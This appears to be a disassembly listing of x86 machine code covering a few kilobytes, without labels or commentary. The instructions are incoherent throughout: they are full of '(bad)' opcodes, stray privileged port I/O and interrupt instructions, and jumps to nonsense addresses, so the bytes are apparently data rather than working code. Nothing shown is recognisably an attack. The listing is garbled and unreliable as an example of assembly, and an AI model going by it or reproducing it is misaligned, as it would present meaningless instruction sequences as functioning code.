  409131:	mov    edx,0xaef4e88e
  409136:	add    ebx,DWORD PTR [eax+0xa]
  409139:	mov    BYTE PTR [ecx+0x53],cl
  40913c:	jo     0x409180
  40913e:	lds    edx,FWORD PTR [edi-0x465ecbbb]
  409144:	mov    al,0x6f
  409146:	dec    esi
  409147:	stc    
  409148:	scas   al,BYTE PTR es:[edi]
  409149:	adc    DWORD PTR [ecx+0x28],ebx
  40914c:	xchg   DWORD PTR [eax],ebx
  40914e:	push   edi
  40914f:	mov    eax,0x5b7988d0
  409154:	out    dx,al
  409155:	xor    DWORD PTR [eax-0x7f9bd4e3],esi
  40915b:	fwait
  40915c:	xchg   ebp,eax
  40915d:	cli    
  40915e:	mov    ebp,0x4ca8964c
  409163:	inc    ebp
  409164:	push   ebx
  409165:	sub    edx,DWORD PTR [ecx-0x5b]
  409168:	dec    eax
  409169:	(bad)  
  40916a:	sub    eax,0x8c800feb
  40916f:	or     bl,BYTE PTR [ebx+0x60]
  409172:	push   ebx
  409173:	retf   
  409174:	shl    DWORD PTR [ebp-0x2ce9f6ae],cl
  40917a:	adc    al,0xa0
  40917c:	jne    0x4091a1
  40917e:	outs   dx,BYTE PTR ds:[esi]
  40917f:	dec    edx
  409180:	add    eax,DWORD PTR [eax-0x1ce73250]
  409186:	mov    ah,0x1d
  409188:	ret    
  409189:	stc    
  40918a:	xchg   ebx,eax
  40918b:	out    0x3b,al
  40918d:	call   0xf2894927
  409192:	inc    ebp
  409193:	xchg   ebp,eax
  409194:	or     eax,0x87012009
  409199:	(bad)  
  40919b:	xlat   BYTE PTR ds:[ebx]
  40919c:	add    BYTE PTR ds:0xeebddf0c,ch
  4091a2:	and    bl,BYTE PTR [eax]
  4091a4:	and    edi,DWORD PTR [bx+di-0x26]
  4091a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4091a9:	jg     0x409172
  4091ab:	add    al,0xc3
  4091ad:	scas   al,BYTE PTR es:[edi]
  4091ae:	cmp    DWORD PTR [ecx+eiz*8-0x2e],edi
  4091b2:	int    0x2d
  4091b4:	sub    al,0x94
  4091b6:	ret    
  4091b7:	dec    esp
  4091b8:	xor    esp,DWORD PTR [ecx+0xf]
  4091bb:	mov    DWORD PTR [esp+eax*2-0x5e86132b],ecx
  4091c2:	mov    dl,0x97
  4091c4:	mov    ch,0x60
  4091c6:	out    dx,eax
  4091c7:	inc    edx
  4091c8:	loope  0x4091b3
  4091ca:	cmp    dl,BYTE PTR [edx]
  4091cc:	mov    ecx,DWORD PTR [edi+0x176563a6]
  4091d2:	mov    ebp,0x7c82a47d
  4091d7:	imul   ecx,DWORD PTR [edx+edx*8+0x43],0x27
  4091dc:	into   
  4091dd:	aad    0xe1
  4091df:	mov    bh,0xfb
  4091e1:	mov    ebx,0xad31a9a6
  4091e6:	idiv   BYTE PTR [ecx-0x77383350]
  4091ec:	mov    bl,0x62
  4091ee:	out    dx,eax
  4091ef:	outs   dx,BYTE PTR ds:[esi]
  4091f0:	sub    bl,ah
  4091f2:	repz imul edx,DWORD PTR [edi+0x5],0x452be644
  4091fa:	jb     0x4091b8
  4091fc:	shr    DWORD PTR [ebp-0x2e],cl
  4091ff:	test   al,0xa7
  409201:	in     eax,0xd8
  409203:	rcl    DWORD PTR [edi+eiz*8],cl
  409206:	jnp    0x409223
  409208:	xchg   ebx,eax
  409209:	imul   esp,DWORD PTR [ebp+0x769ba5e2],0x3e813f5e
  409213:	icebp  
  409214:	dec    ecx
  409215:	mov    ah,0x6b
  409217:	mov    DWORD PTR [edi],0x443a968a
  40921d:	sub    ah,BYTE PTR [eax+ebp*8]
  409220:	pop    ds
  409221:	push   0x87a11297
  409226:	ror    DWORD PTR [ecx-0x26],cl
  409229:	push   ebp
  40922a:	adc    al,0x62
  40922c:	sti    
  40922d:	sub    ecx,DWORD PTR [eax-0xf]
  409230:	sub    DWORD PTR [si],esi
  409233:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409234:	add    DWORD PTR [ecx],0xffffffb7
  409237:	pop    esp
  409238:	inc    ebx
  409239:	or     BYTE PTR [eax-0x5a7c8c90],dh
  40923f:	pusha  
  409240:	sub    bl,cl
  409242:	shl    DWORD PTR [ecx-0x49],1
  409245:	push   edx
  409246:	xchg   ecx,eax
  409247:	mov    al,ds:0xf5499f5
  40924c:	sti    
  40924d:	fidivr WORD PTR [eax-0x5a]
  409250:	lods   al,BYTE PTR ds:[esi]
  409251:	inc    edi
  409252:	mov    ch,0xb6
  409254:	push   ebp
  409255:	or     eax,0xf0a5e3d9
  40925a:	adc    edi,DWORD PTR ds:0x5efe6d06
  409260:	and    ecx,DWORD PTR [esi]
  409262:	mov    ?,WORD PTR ds:0x2a808146
  409268:	push   es
  409269:	(bad)  
  40926a:	int3   
  40926b:	mov    eax,0x99e04be1
  409270:	in     al,0x3e
  409272:	loope  0x4092d8
  409274:	retf   0x2cae
  409277:	aaa    
  409278:	cmp    eax,0x32e4bf72
  40927d:	adc    eax,DWORD PTR [ebx+0x7c8477ee]
  409283:	enter  0x53ae,0x94
  409287:	in     eax,dx
  409288:	lds    eax,FWORD PTR [ecx-0xe]
  40928b:	gs push ebp
  40928d:	xchg   ecx,eax
  40928e:	xor    DWORD PTR [ebx+0x2ae2c465],0xffffffcd
  409295:	repnz imul edi,DWORD PTR [edi-0x7f],0x6e
  40929a:	rol    DWORD PTR [edi-0x41],1
  40929d:	cmp    DWORD PTR [edi],ebx
  40929f:	cld    
  4092a0:	mov    edx,0xace10c99
  4092a5:	call   0xdbcf3aef
  4092aa:	add    ecx,ebx
  4092ac:	aas    
  4092ad:	mov    BYTE PTR [edi],0x6b
  4092b0:	jle    0x4092f5
  4092b2:	test   bh,al
  4092b4:	cmp    DWORD PTR cs:[ecx-0x6f5ed46b],0x6711a8cf
  4092bf:	inc    ebp
  4092c0:	add    eax,0xc3e27226
  4092c5:	mov    ?,WORD PTR [esi+0x1f]
  4092c8:	pop    esp
  4092c9:	jmp    0x409341
  4092cb:	pop    edi
  4092cc:	cmp    al,0xa3
  4092ce:	imul   edx,DWORD PTR [esi],0xffffffbd
  4092d1:	lds    esp,FWORD PTR [ebp+esi*2+0x2a374ee6]
  4092d8:	xchg   ebp,eax
  4092d9:	xchg   edx,eax
  4092da:	mov    al,ds:0x1c316d94
  4092df:	hlt    
  4092e0:	test   al,0x46
  4092e2:	xchg   ebx,eax
  4092e3:	mov    eax,ds:0x6af35eb9
  4092e8:	je     0x40932a
  4092ea:	iret   
  4092eb:	push   ebp
  4092ec:	outs   dx,DWORD PTR ds:[esi]
  4092ed:	mov    dh,bl
  4092ef:	fwait
  4092f0:	je     0x4092a8
  4092f2:	add    ah,0x3a
  4092f5:	add    cl,bh
  4092f7:	cmp    DWORD PTR [edx-0x4044df40],edi
  4092fd:	dec    eax
  4092fe:	inc    ecx
  4092ff:	jge    0x4092d9
  409301:	inc    edi
  409302:	mov    esp,0x7a3bbfac
  409307:	je     0x40936f
  409309:	test   BYTE PTR [ecx-0x11],dl
  40930c:	out    dx,eax
  40930d:	jge    0x40934e
  40930f:	and    DWORD PTR [edi+0x7b],0x71dff77f
  409316:	cmp    BYTE PTR [ebx],ah
  409318:	push   ds
  409319:	retf   
  40931a:	(bad)  
  40931b:	pop    esp
  40931c:	ror    al,0x86
  40931f:	mov    cl,0x52
  409321:	push   ebp
  409322:	in     al,0x1d
  409324:	pop    esp
  409325:	mov    dh,0x73
  409327:	jmp    0xb3cbe9d9
  40932c:	jmp    0x4092e1
  40932e:	mov    BYTE PTR [esi+0x252de694],al
  409334:	not    BYTE PTR [edi-0x5d]
  409337:	rcl    DWORD PTR [eax],cl
  409339:	and    al,0xe2
  40933b:	(bad)  
  40933c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40933d:	stc    
  40933e:	push   ebp
  40933f:	popf   
  409340:	out    0x51,al
  409342:	xchg   ebp,eax
  409343:	or     eax,0xb6acea42
  409348:	adc    edx,DWORD PTR [ebx]
  40934a:	push   edi
  40934b:	outs   dx,DWORD PTR ds:[esi]
  40934c:	adc    DWORD PTR [edi-0xa],eax
  40934f:	idiv   BYTE PTR [ecx-0xeb25799]
  409355:	mov    edi,0x3375a344
  40935a:	dec    ecx
  40935b:	ins    DWORD PTR es:[edi],dx
  40935c:	(bad)  
  40935d:	in     eax,0x11
  40935f:	ds inc ecx
  409361:	call   0xdeb8:0x7a1ce3f4
  409368:	stos   DWORD PTR es:[edi],eax
  409369:	retf   0xc28d
  40936c:	push   0x2b56c84b
  409371:	xchg   ebp,eax
  409372:	mov    ebp,0xaf13270e
  409377:	xchg   BYTE PTR [edi+eax*2],bh
  40937a:	inc    ebp
  40937b:	push   esi
  40937c:	mov    ds:0xc7bea9c,al
  409381:	das    
  409382:	pop    edx
  409383:	dec    edi
  409384:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409385:	out    dx,al
  409386:	retf   
  409387:	mov    edi,0x8b3b8e6d
  40938c:	mov    esi,0x7caca191
  409391:	jo     0x4093ca
  409393:	jecxz  0x4093ee
  409395:	out    0x23,eax
  409397:	mov    esi,edx
  409399:	ficom  WORD PTR [edi-0x14f870f5]
  40939f:	push   ebp
  4093a0:	sbb    esi,DWORD PTR [ecx-0x1a72f66a]
  4093a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4093a7:	xchg   ecx,eax
  4093a8:	add    BYTE PTR [ebp+0x1d],0x44
  4093ac:	and    al,0x3c
  4093ae:	aad    0xdc
  4093b0:	sub    dl,BYTE PTR [eax]
  4093b2:	and    bl,BYTE PTR [ecx-0x40]
  4093b5:	sar    DWORD PTR [eax+0x65],0xa7
  4093b9:	add    esi,eax
  4093bb:	or     al,0xee
  4093bd:	cwde   
  4093be:	nop
  4093bf:	jl     0x40937f
  4093c1:	push   eax
  4093c2:	and    eax,0x6377982c
  4093c7:	ret    
  4093c8:	fidivr WORD PTR [edx*1-0x2e9a59b8]
  4093cf:	xor    BYTE PTR [ebx-0x4600ecf],ah
  4093d5:	ins    DWORD PTR es:[edi],dx
  4093d6:	stos   DWORD PTR es:[edi],eax
  4093d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4093d8:	push   ecx
  4093d9:	push   ds
  4093da:	aam    0xdb
  4093dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4093dd:	push   0xffffffbf
  4093df:	leave  
  4093e0:	mov    ebx,0xbe432922
  4093e5:	lea    ebp,[eax]
  4093e7:	sahf   
  4093e8:	icebp  
  4093e9:	jo     0x409394
  4093eb:	test   eax,0xccabee3a
  4093f0:	or     dh,BYTE PTR [ebp+0x2c]
  4093f3:	out    dx,al
  4093f4:	repz inc eax
  4093f6:	cmp    DWORD PTR [eax],ecx
  4093f8:	mov    DWORD PTR [ebx],ebp
  4093fa:	(bad)  
  4093fb:	pop    ds
  4093fc:	rcr    dh,0xbb
  4093ff:	adc    BYTE PTR [esi+0x19],bl
  409402:	cmp    edx,DWORD PTR ds:0x6f3389a
  409408:	sbb    al,BYTE PTR [esi]
  40940a:	xchg   ecx,eax
  40940b:	js     0x4093a0
  40940d:	shl    esp,cl
  40940f:	dec    esp
  409410:	aaa    
  409411:	jle    0x4093b3
  409413:	mov    ds:0x1efdbb87,al
  409418:	jbe    0x4093c2
  40941a:	mov    esp,0x5bf9b490
  40941f:	enter  0xfc04,0xcc
  409423:	and    esp,0x288501fc
  409429:	dec    esi
  40942a:	test   DWORD PTR [ebx+eiz*2+0x47a552db],ebx
  409431:	punpcklbw mm2,mm1
  409434:	mov    ecx,0xcf4591d8
  409439:	adc    edi,DWORD PTR ds:0xa90ff921
  40943f:	ins    DWORD PTR es:[edi],dx
  409440:	ins    DWORD PTR es:[edi],dx
  409441:	mov    edi,0x8719bccb
  409446:	cmp    BYTE PTR [esi-0x34a563c7],dh
  40944c:	sbb    al,0x2b
  40944e:	xor    BYTE PTR [edx-0x22],ch
  409451:	outs   dx,BYTE PTR ds:[esi]
  409452:	xor    eax,0xe0694d7
  409457:	mov    esi,0x8de1973a
  40945c:	enter  0xf324,0x4e
  409460:	cwde   
  409461:	pop    eax
  409462:	inc    ecx
  409463:	lds    ebx,FWORD PTR [esi]
  409465:	ret    
  409466:	popf   
  409467:	call   0x46c2:0xa7716d86
  40946e:	sub    al,0x3
  409470:	test   DWORD PTR [ecx],esp
  409472:	dec    eax
  409473:	dec    esi
  409474:	loop   0x409471
  409476:	push   edx
  409477:	fwait
  409478:	xchg   esp,eax
  409479:	xor    dh,BYTE PTR [ebx-0x3edcc58d]
  40947f:	out    dx,al
  409480:	lock pop eax
  409482:	adc    edx,0x29
  409485:	stos   DWORD PTR es:[edi],eax
  409486:	nop
  409487:	arpl   WORD PTR [edi+0x7d],sp
  40948a:	xchg   ebx,eax
  40948b:	ds mov al,0x59
  40948e:	cwde   
  40948f:	push   cs
  409490:	mov    dl,0xe6
  409492:	neg    WORD PTR [ecx]
  409495:	daa    
  409496:	repnz rol dl,0xb2
  40949a:	shr    esi,1
  40949c:	ret    0x497e
  40949f:	pop    ebp
  4094a0:	or     al,0xe5
  4094a2:	push   ss
  4094a3:	mov    edi,0x4a2e8687
  4094a8:	cmp    eax,0x2feeeb4e
  4094ad:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  4094af:	(bad)  
  4094b0:	popf   
  4094b1:	sub    ah,dh
  4094b3:	cwde   
  4094b4:	out    0x86,eax
  4094b6:	(bad)  
  4094b7:	imul   ebp,DWORD PTR [esp+eax*8],0xffffffa4
  4094bb:	cli    
  4094bc:	loope  0x40950c
  4094be:	push   ss
  4094bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4094c0:	cmp    al,0x35
  4094c2:	daa    
  4094c3:	inc    esp
  4094c4:	mov    eax,0xf5679cd0
  4094c9:	sahf   
  4094ca:	imul   esp,eax,0x4a43bf6e
  4094d0:	ds (bad) 
  4094d2:	aas    
  4094d3:	xchg   ebp,eax
  4094d4:	inc    DWORD PTR [edx+0x44]
  4094d7:	fs push esi
  4094d9:	jne    0x4094a1
  4094db:	adc    eax,0x63874ffc
  4094e0:	sti    
  4094e1:	jecxz  0x409493
  4094e3:	jo     0x4094e7
  4094e5:	dec    eax
  4094e6:	ss stc 
  4094e8:	xchg   DWORD PTR [ecx+0x38],ecx
  4094eb:	in     al,dx
  4094ec:	(bad)  
  4094ed:	int3   
  4094ee:	pusha  
  4094ef:	xchg   ebx,eax
  4094f0:	sub    edi,DWORD PTR [edi+0x44a7ecfe]
  4094f6:	mov    ds:0x546a7a32,al
  4094fb:	jne    0x40953c
  4094fd:	ins    DWORD PTR es:[edi],dx
  4094fe:	cmc    
  4094ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409500:	add    eax,0xa33b17b1
  409505:	pop    edi
  409506:	cmp    eax,ecx
  409508:	call   0xa7a69cd9
  40950d:	pop    ds
  40950e:	push   0xffffffb5
  409510:	(bad)  
  409511:	nop    DWORD PTR [eax+0x19]
  409515:	adc    edi,ecx
  409517:	stos   BYTE PTR es:[edi],al
  409518:	mov    dl,0x3c
  40951a:	mov    al,ds:0x59e9987c
  40951f:	ret    
  409520:	add    DWORD PTR [ebp+0x40df7eee],ebp
  409526:	mov    al,ds:0x1ce9a0bf
  40952b:	adc    bl,dh
  40952d:	add    dl,ch
  40952f:	mov    esp,0xc180a86f
  409534:	in     eax,dx
  409535:	add    DWORD PTR [edx],edx
  409537:	or     dh,ah
  409539:	mov    al,ds:0x35e0a730
  40953e:	mov    eax,0x98fbde3b
  409543:	cmp    eax,0x413ce03d
  409548:	iret   
  409549:	mov    cl,0xb4
  40954b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40954c:	test   ch,cl
  40954e:	sar    DWORD PTR [ebx],0x83
  409551:	push   esp
  409552:	pop    ss
  409553:	cwde   
  409554:	std    
  409555:	sub    ch,BYTE PTR [ecx]
  409557:	sbb    DWORD PTR [eax],edx
  409559:	out    dx,al
  40955a:	out    0x9e,al
  40955c:	mov    al,ds:0x4161669b
  409561:	outs   dx,BYTE PTR ds:[esi]
  409562:	in     eax,dx
  409563:	sbb    BYTE PTR [ebx+0x72db724c],0x64
  40956a:	enter  0xde7d,0x43
  40956e:	xor    DWORD PTR [ecx-0xa],0xffffff92
  409572:	adc    eax,0x543859bd
  409577:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409578:	in     eax,0x7e
  40957a:	mov    BYTE PTR [edi-0x658859ec],0xcb
  409581:	ins    DWORD PTR es:[edi],dx
  409582:	loop   0x4095c0
  409584:	ror    BYTE PTR [ebx-0x9],1
  409587:	xchg   ebp,eax
  409588:	loop   0x409515
  40958a:	mov    eax,0x72929940
  40958f:	hlt    
  409590:	stos   DWORD PTR es:[edi],eax
  409591:	or     bl,BYTE PTR [esi+ebx*8-0x6b]
  409595:	mov    ecx,0xdd39b859
  40959a:	pushf  
  40959b:	xchg   ebx,eax
  40959c:	rol    BYTE PTR [esi-0x60],0x49
  4095a0:	rol    DWORD PTR [eax+0x71a8f6ad],0x82
  4095a7:	cmp    BYTE PTR [eax+0xf],al
  4095aa:	xor    ebp,DWORD PTR [esp+ebp*2-0xf0ebc8b]
  4095b1:	daa    
  4095b2:	les    edi,FWORD PTR [eax]
  4095b4:	aam    0x5d
  4095b6:	or     ebx,DWORD PTR [ebx]
  4095b8:	push   0x1a
  4095ba:	fsubrp st(5),st
  4095bc:	xchg   ebx,eax
  4095bd:	sub    al,0xe0
  4095bf:	sti    
  4095c0:	mov    ds:0xba7c72cf,eax
  4095c5:	stos   BYTE PTR es:[edi],al
  4095c6:	scas   eax,DWORD PTR es:[edi]
  4095c7:	jne    0x409577
  4095c9:	pop    edx
  4095ca:	xchg   ecx,eax
  4095cb:	in     al,dx
  4095cc:	ror    BYTE PTR [eax+ebx*1-0x6134a52e],0xdb
  4095d4:	push   0x752031e2
  4095d9:	cmp    DWORD PTR [esi-0x18],edi
  4095dc:	dec    esp
  4095dd:	xchg   ebp,eax
  4095de:	mov    ah,0x88
  4095e0:	and    BYTE PTR [ebp+0x4fd1b343],al
  4095e6:	and    al,0x96
  4095e8:	dec    esp
  4095e9:	ds mov cl,0x98
  4095ec:	stc    
  4095ed:	retf   0xe3b5
  4095f0:	xor    esi,ebp
  4095f2:	pop    ecx
  4095f3:	inc    ecx
  4095f4:	cmp    edx,0x162874dd
  4095fa:	push   edi
  4095fb:	ret    
  4095fc:	ins    DWORD PTR es:[edi],dx
  4095fd:	cmp    ebx,esp
  4095ff:	rcl    BYTE PTR [eax-0x68],0x55
  409603:	cld    
  409604:	xchg   esi,eax
  409605:	mov    ah,0xa5
  409607:	jae    0x4095af
  409609:	out    dx,eax
  40960a:	mov    al,0x77
  40960c:	int3   
  40960d:	mov    al,ds:0x8b50d132
  409612:	loop   0x40962f
  409614:	fisttp QWORD PTR [edx+esi*4]
  409617:	repnz pop edi
  409619:	cmp    BYTE PTR [esp-0x53ca598],bl
  409620:	sub    BYTE PTR [eax],al
  409622:	inc    edi
  409623:	fnsave [ebx+0x4f]
  409626:	push   esp
  409627:	push   ecx
  409628:	mov    ebp,0x7b8ad240
  40962d:	push   esi
  40962e:	stc    
  40962f:	or     edi,DWORD PTR [ecx+0x65]
  409632:	and    al,0xab
  409634:	and    eax,0x41b5a308
  409639:	xchg   edi,eax
  40963a:	rol    DWORD PTR [ebx],cl
  40963c:	mov    WORD PTR [esi-0x80],fs
  40963f:	add    BYTE PTR [ecx-0x47259b4a],0x82
  409646:	gs dec ebx
  409648:	adc    cl,BYTE PTR [edx+ecx*4+0x53]
  40964c:	jbe    0x4096cb
  40964e:	mov    DWORD PTR [ebx+0x20],ebp
  409651:	ins    BYTE PTR es:[edi],dx
  409652:	jns    0x40965f
  409654:	out    dx,eax
  409655:	adc    eax,0x76268522
  40965a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40965b:	inc    edi
  40965c:	xor    cl,BYTE PTR [edx-0x1a5fba74]
  409662:	stos   DWORD PTR es:[edi],eax
  409663:	dec    edi
  409664:	jge    0x4096d5
  409666:	sub    al,0xb0
  409668:	hlt    
  409669:	xchg   ebx,eax
  40966a:	or     al,ah
  40966c:	or     DWORD PTR [edi+0x30992060],ecx
  409672:	mov    edx,0xc46f36be
  409677:	mov    bh,0xc6
  409679:	pop    ebp
  40967a:	pop    esp
  40967b:	jns    0x4096bd
  40967d:	lods   al,BYTE PTR ds:[esi]
  40967e:	outs   dx,BYTE PTR ds:[esi]
  40967f:	idiv   DWORD PTR [edi-0x38]
  409682:	mov    eax,ds:0xbe635096
  409687:	mov    ebx,0xad6559cb
  40968c:	fist   WORD PTR cs:[ebx+eax*2]
  409690:	stc    
  409691:	data16 jecxz 0x4096f5
  409694:	pop    ecx
  409695:	out    dx,al
  409696:	call   DWORD PTR [edi+edi*1]
  409699:	std    
  40969a:	ret    
  40969b:	jmp    0x4096a8
  40969d:	jae    0x409638
  40969f:	and    DWORD PTR ds:0x39f9c6ce,esp
  4096a5:	not    DWORD PTR [ebx-0x3]
  4096a8:	inc    ah
  4096aa:	imul   ebx,edi,0xa63c7f68
  4096b0:	repz div BYTE PTR [esi]
  4096b3:	call   0xb2f15935
  4096b8:	(bad)  
  4096b9:	cli    
  4096ba:	stos   DWORD PTR es:[edi],eax
  4096bb:	mov    ebp,0x3d0e117c
  4096c0:	fsub   DWORD PTR [eax+0x33]
  4096c3:	fwait
  4096c4:	aas    
  4096c5:	pop    esp
  4096c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4096c7:	add    BYTE PTR [esi+0x70],cl
  4096ca:	pop    ecx
  4096cb:	jmp    0x7d24:0xdd8cb8a2
  4096d2:	(bad)  
  4096d3:	fild   QWORD PTR [ebp-0x5a]
  4096d6:	sti    
  4096d7:	jbe    0x4096f4
  4096d9:	dec    ebx
  4096da:	pop    ds
  4096db:	icebp  
  4096dc:	mov    bl,0x5e
  4096de:	fwait
  4096df:	js     0x40973b
  4096e1:	(bad)  
  4096e2:	mov    al,0xe9
  4096e4:	xlat   BYTE PTR ds:[ebx]
  4096e5:	mov    ds:0xe599390c,al
  4096ea:	pop    ebx
  4096eb:	jae    0x409758
  4096ed:	fdiv   DWORD PTR [esi+0x46e590ee]
  4096f3:	iret   
  4096f4:	test   al,0xb5
  4096f6:	push   eax
  4096f7:	mov    ebx,?
  4096f9:	pop    ss
  4096fa:	sbb    edx,DWORD PTR [edi]
  4096fc:	inc    DWORD PTR [edi-0x64027861]
  409702:	aaa    
  409703:	ja     0x4096db
  409705:	ins    DWORD PTR es:[edi],dx
  409706:	dec    esp
  409707:	pop    ebp
  409708:	mov    BYTE PTR [ebx+0x40],cl
  40970b:	lods   al,BYTE PTR ds:[esi]
  40970c:	in     al,0x26
  40970e:	(bad)  
  40970f:	outs   dx,DWORD PTR ds:[esi]
  409710:	add    eax,0x3ae9007f
  409715:	out    0xe0,al
  409717:	dec    eax
  409718:	enter  0xf837,0xd5
  40971c:	adc    BYTE PTR ss:[esi+0x17],ah
  409720:	jge    0x4096b7
  409722:	ja     0x409784
  409724:	mov    edx,0xb2977b30
  409729:	bound  ecx,QWORD PTR [esi-0x37]
  40972c:	xor    BYTE PTR ds:0xee02b8bd,0x70
  409733:	(bad)  
  409734:	call   0x49ba4de4
  409739:	push   esi
  40973a:	in     eax,0xcb
  40973c:	test   al,0xda
  40973e:	push   esi
  40973f:	bound  eax,QWORD PTR [ebx]
  409741:	btr    ebx,0x36
  409745:	adc    DWORD PTR [edx+0x233d03d1],ebx
  40974b:	xchg   ecx,eax
  40974c:	inc    esp
  40974d:	retfw  
  40974f:	in     eax,dx
  409750:	mov    esi,0x2b4976d
  409755:	aas    
  409756:	stos   DWORD PTR es:[edi],eax
  409757:	xchg   edx,eax
  409758:	push   esp
  409759:	fidivr DWORD PTR [edx-0x11]
  40975c:	jmp    0x409752
  40975e:	dec    ebp
  40975f:	fisttp DWORD PTR [edi-0x65]
  409762:	xor    esi,ebp
  409764:	mov    cl,0x30
  409766:	repz jae 0x4097ad
  409769:	inc    esp
  40976a:	cmp    edx,DWORD PTR [eax+ebx*2-0x4e]
  40976e:	fcom   QWORD PTR [ecx+0x5]
  409771:	pop    ss
  409772:	nop
  409773:	fidiv  DWORD PTR [edx+eax*2]
  409776:	aas    
  409777:	mov    fs,WORD PTR [ecx+0x7713032b]
  40977d:	lods   al,BYTE PTR ds:[esi]
  40977e:	add    al,0x2f
  409780:	jecxz  0x409721
  409782:	pop    esi
  409783:	mov    al,0xc1
  409785:	add    bh,BYTE PTR [esi+0x75]
  409788:	int    0x3a
  40978a:	lahf   
  40978b:	pop    edx
  40978c:	stc    
  40978d:	outs   dx,DWORD PTR ds:[esi]
  40978e:	inc    esi
  40978f:	cs aaa 
  409791:	int    0xc7
  409793:	dec    esp
  409794:	add    al,0x8d
  409796:	repnz out dx,eax
  409798:	add    edx,ecx
  40979a:	fwait
  40979b:	inc    ebx
  40979c:	mov    BYTE PTR [ecx+0x4a95a478],al
  4097a2:	test   ebx,ebp
  4097a4:	ds cmp al,0xd2
  4097a7:	(bad)  
  4097a8:	fadd   DWORD PTR [edx]
  4097aa:	pop    edi
  4097ab:	int3   
  4097ac:	pop    esp
  4097ad:	push   ebp
  4097ae:	imul   ebp,DWORD PTR [edx],0xffffff9c
  4097b1:	mov    ebx,0x62140b63
  4097b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4097b7:	rcr    DWORD PTR [edi-0x529d3ded],0x22
  4097be:	mov    ecx,0xea9af9d5
  4097c3:	div    esp
  4097c5:	fmul   st,st(7)
  4097c7:	dec    ecx
  4097c8:	bound  ecx,QWORD PTR [ebp-0x7]
  4097cb:	cs sti 
  4097cd:	ins    DWORD PTR es:[edi],dx
  4097ce:	cmc    
  4097cf:	xor    DWORD PTR [ebx+0x581f54b8],edx
  4097d5:	sbb    DWORD PTR [edi-0x64],ebp
  4097d8:	jbe    0x4097f2
  4097da:	aam    0x31
  4097dc:	bound  ecx,QWORD PTR [ecx]
  4097de:	inc    eax
  4097df:	stos   BYTE PTR es:[edi],al
  4097e0:	xchg   DWORD PTR [esi],ecx
  4097e2:	out    dx,al
  4097e3:	(bad)
  4097e6:	sbb    dl,BYTE PTR [esi+edx*8]
  4097e9:	shl    BYTE PTR [edx+0x62ffddb9],1
  4097ef:	xchg   esp,eax
  4097f0:	scas   al,BYTE PTR es:[edi]
  4097f1:	sbb    al,0x56
  4097f3:	out    0xc3,al
  4097f5:	stc    
  4097f6:	loop   0x409795
  4097f8:	fadd   QWORD PTR [edi+eiz*8]
  4097fb:	sub    ah,BYTE PTR [ecx]
  4097fd:	inc    esp
  4097fe:	mov    bl,0xd0
  409800:	clc    
  409801:	sub    BYTE PTR [edx],0x7e
  409804:	push   0x189de9b7
  409809:	sbb    ecx,DWORD PTR [ecx+0x6bd0e3c0]
  40980f:	lds    esi,FWORD PTR [ecx+0x7ec323d0]
  409815:	mov    edx,0x618cc6fd
  40981a:	jmp    0x2979:0xcf75db46
  409821:	mov    eax,DWORD PTR [eax]
  409823:	jle    0x409866
  409825:	and    al,0x23
  409827:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409828:	outs   dx,DWORD PTR ds:[esi]
  409829:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40982a:	xchg   BYTE PTR [edi-0xf61ad2d],bl
  409830:	test   DWORD PTR [esi-0x4e15e664],ebx
  409836:	dec    esi
  409837:	push   esp
  409838:	icebp  
  409839:	scas   eax,DWORD PTR es:[edi]
  40983a:	je     0x40984c
  40983c:	stos   BYTE PTR es:[edi],al
  40983d:	or     BYTE PTR [ecx+0x6b],bh
  409840:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409841:	jbe    0x409875
  409843:	or     eax,0x586b2800
  409848:	xchg   edx,eax
  409849:	jno    0x409829
  40984b:	cli    
  40984c:	lea    ebx,[edx-0x64]
  40984f:	mov    edx,0xd6dff251
  409854:	dec    esp
  409855:	mov    ds:0x766cb8f,eax
  40985a:	loopne 0x40988d
  40985c:	mov    WORD PTR [ebx],es
  40985e:	lock cld 
  409860:	arpl   WORD PTR [eax-0x77150129],bx
  409866:	loope  0x409859
  409868:	xor    bh,BYTE PTR [eax+0x576ed999]
  40986e:	lods   eax,DWORD PTR ds:[esi]
  40986f:	or     esp,DWORD PTR [edx+0x52e9b3b9]
  409875:	(bad)  [edx]
  409877:	jecxz  0x40980f
  409879:	mov    bl,0x5b
  40987b:	lahf   
  40987c:	dec    edi
  40987d:	mov    cl,0xfd
  40987f:	cli    
  409880:	mov    ah,0x67
  409882:	add    al,0xf1
  409884:	push   ds
  409885:	lock popf 
  409887:	dec    edx
  409888:	ds ss dec esi
  40988b:	inc    eax
  40988c:	ss push ds
  40988e:	dec    edx
  40988f:	pop    edi
  409890:	scas   al,BYTE PTR es:[edi]
  409891:	push   edi
  409892:	jg     0x409814
  409894:	lahf   
  409895:	in     al,0xef
  409897:	pusha  
  409898:	push   eax
  409899:	jnp    0x40985a
  40989b:	inc    esi
  40989c:	inc    ecx
  40989d:	jno    0x4098aa
  40989f:	js     0x409822
  4098a1:	ins    DWORD PTR es:[edi],dx
  4098a2:	stos   BYTE PTR es:[edi],al
  4098a3:	add    eax,0x8472a6d9
  4098a8:	sub    eax,0xea6413ae
  4098ad:	data16 fistp DWORD PTR es:[esi]
  4098b1:	cmp    eax,0x850c8745
  4098b6:	xchg   ecx,eax
  4098b7:	pusha  
  4098b8:	pop    edi
  4098b9:	loopne 0x40990e
  4098bb:	in     al,0x8b
  4098bd:	outs   dx,DWORD PTR ds:[esi]
  4098be:	push   es
  4098bf:	loopne 0x40993d
